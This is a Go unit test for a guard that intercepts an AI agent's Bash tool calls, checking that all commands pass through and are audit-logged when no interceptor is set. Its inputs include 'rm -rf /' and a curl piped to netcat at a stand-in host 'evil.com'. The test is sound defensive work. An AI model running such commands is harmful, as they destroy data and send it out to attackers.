package guard

import (
	"context"
	"encoding/json"
	"testing"

	"norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit records exactly one allow row per gated call, with the same command
	logs := g.Audit()
	if len(logs) != 4 {
		t.Fatalf("gated 4 calls but audit has %d rows: %#v", len(logs), logs)
	}
	for i, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if logs[i].Action != "allow" || logs[i].Command != cmd {
			t.Errorf("audit[%d] = %#v, want allow with command %q", i, logs[i], cmd)
		}
	}
}

var _ = hook.PreToolUse
